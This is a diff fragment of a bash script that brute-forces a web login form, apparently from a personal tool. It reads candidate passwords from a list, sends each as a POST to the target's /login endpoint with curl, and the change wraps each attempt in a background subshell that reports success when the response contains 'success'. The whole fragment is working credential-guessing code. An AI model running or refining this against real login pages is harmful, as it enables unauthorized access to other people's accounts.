@@ -88,17 +88,32 @@ begin(){
 	printf "===================================================\n\n"
 
 	attempts=0
+	max_jobs=0
 	start=$(date +%s%N)
 
+
+	declare -A jobs
 	while read -r pass
 	do
 
 		[[ -z "$pass" ]] && continue
 
-		 echo "[-] Trying: $pass"
+		echo "[-] Trying: $pass"
+
 		((attempts++))
 
-		curl -s -X Post "$url/login" -d "username=$user&password=$pass" &
+		(
+
+			response=$(curl -s -X Post "$url/login" -d "username=$user&password=$pass")
+
+			if [[ "$response" == *success* ]]; then
+
+				exit 0
+			else
+				exit 1
+			fi
+
+		) &
 
 		pid=$!
 
